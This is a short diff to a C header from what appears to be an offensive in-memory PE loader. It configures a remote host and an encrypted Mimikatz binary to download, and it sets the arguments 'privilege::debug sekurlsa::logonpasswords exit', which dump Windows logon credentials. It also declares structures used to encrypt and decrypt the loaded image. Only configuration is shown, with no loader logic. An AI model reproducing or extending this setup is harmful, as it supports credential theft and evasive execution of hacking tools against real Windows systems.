@@ -21,7 +21,7 @@
 
 #define HOST L"192.168.100.161"
 #define REMOTE_FILE L"mimikatz-enc.bin"
-#define LOCAL_FILE "C:\\Users\\lgreenleaf\\Desktop\\mimikatz-enc.bin"
+//#define LOCAL_FILE "C:\\Users\\lgreenleaf\\Desktop\\mimikatz-enc.bin"
 
 #define PE_ARGS "privilege::debug sekurlsa::logonpasswords exit"
 //#define DLL_EXPORTED_FUNC "someExportedFunc"    //in case of DLLs
@@ -59,6 +59,10 @@ extern NTCONF g_NtConfig;
 extern NTCONF g_Win32u;     // Struct to hold extracted PE headers from win32u.dll
 extern SC_FUNC g_Fun;
 extern CONTENT temp;    //To hold the Base addres of the copied PE and its size, used to encrypt/decrypt its content
+
+extern SECTION textSect;
+extern SECTION dataSect;
+extern SECTION rdataSect;
 
 
 /*-------------------------
